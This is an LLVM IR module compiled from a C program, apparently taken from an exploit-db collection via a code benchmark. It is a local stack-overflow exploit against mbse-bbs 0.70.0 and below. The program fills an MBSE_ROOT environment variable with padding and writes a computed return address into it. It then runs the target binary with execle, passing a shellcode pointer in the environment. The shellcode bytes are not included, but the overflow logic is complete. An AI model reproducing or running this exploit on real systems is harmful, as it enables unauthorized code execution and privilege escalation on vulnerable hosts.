; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_3154.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_3154.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.envh = private unnamed_addr constant [11 x i8] c"MBSE_ROOT=\00", align 1
@.str = private unnamed_addr constant [60 x i8] c"[ GNU/Linux mbse-bbs 0.70.0 & below stack overflow exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"Error: [path]\0A\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [29 x i8] c"[ Using return address 0x%x\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"x\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca [11 x i8], align 1
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca [2 x i8*], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 1094795585, i64* %7, align 8
  %12 = bitcast [11 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %12, i8* align 1 getelementptr inbounds ([11 x i8], [11 x i8]* @__const.main.envh, i32 0, i32 0), i64 11, i1 false)
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 2
  br i1 %15, label %16, label %19

16:                                               ; preds = %2
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 @exit(i32 0) #4
  unreachable

19:                                               ; preds = %2
  %20 = getelementptr inbounds [11 x i8], [11 x i8]* %8, i64 0, i64 0
  %21 = call i32 @strlen(i8* %20)
  %22 = add nsw i32 %21, 4085
  %23 = sext i32 %22 to i64
  %24 = add i64 %23, 8
  %25 = trunc i64 %24 to i32
  %26 = call i8* @malloc(i32 %25)
  store i8* %26, i8** %9, align 8
  %27 = load i8*, i8** %9, align 8
  %28 = getelementptr inbounds [11 x i8], [11 x i8]* %8, i64 0, i64 0
  %29 = call i32 @strcpy(i8* %27, i8* %28)
  %30 = load i8*, i8** %9, align 8
  %31 = ptrtoint i8* %30 to i64
  store i64 %31, i64* %10, align 8
  store i32 1, i32* %6, align 4
  br label %32

32:                                               ; preds = %38, %19
  %33 = load i32, i32* %6, align 4
  %34 = icmp sle i32 %33, 4061
  br i1 %34, label %35, label %41

35:                                               ; preds = %32
  %36 = load i8*, i8** %9, align 8
  %37 = call i32 @strncat(i8* %36, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i32 1)
  br label %38

38:                                               ; preds = %35
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %6, align 4
  br label %32

41:                                               ; preds = %32
  %42 = load i64, i64* %10, align 8
  %43 = add nsw i64 %42, 4061
  store i64 %43, i64* %10, align 8
  %44 = load i64, i64* %10, align 8
  %45 = inttoptr i64 %44 to i8*
  %46 = bitcast i64* %7 to i8*
  %47 = call i32 @memcpy(i8* %45, i8* %46, i32 4)
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strlen(i8* %50)
  %52 = sub i32 -1073741828, %51
  %53 = sub i32 %52, 1
  %54 = load i8*, i8** %9, align 8
  %55 = call i32 @strlen(i8* %54)
  %56 = sub i32 %53, %55
  %57 = sub i32 %56, 1
  %58 = load i8*, i8** @shellcode, align 8
  %59 = call i32 @strlen(i8* %58)
  %60 = sub i32 %57, %59
  %61 = sub i32 %60, 1
  %62 = zext i32 %61 to i64
  store i64 %62, i64* %7, align 8
  %63 = load i64, i64* %10, align 8
  %64 = inttoptr i64 %63 to i8*
  %65 = bitcast i64* %7 to i8*
  %66 = call i32 @memcpy(i8* %64, i8* %65, i32 4)
  %67 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  %68 = load i8*, i8** %9, align 8
  store i8* %68, i8** %67, align 8
  %69 = getelementptr inbounds i8*, i8** %67, i64 1
  store i8* null, i8** %69, align 8
  %70 = load i64, i64* %7, align 8
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i64 %70)
  %72 = load i8**, i8*** %5, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 1
  %74 = load i8*, i8** %73, align 8
  %75 = load i8**, i8*** %5, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 1
  %77 = load i8*, i8** %76, align 8
  %78 = load i8*, i8** @shellcode, align 8
  %79 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  %80 = call i32 @execle(i8* %74, i8* %77, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i8* %78, i32* null, i8** %79)
  %81 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i8* @malloc(i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strncat(i8*, i8*, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i8*, i8*, i32*, i8**) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
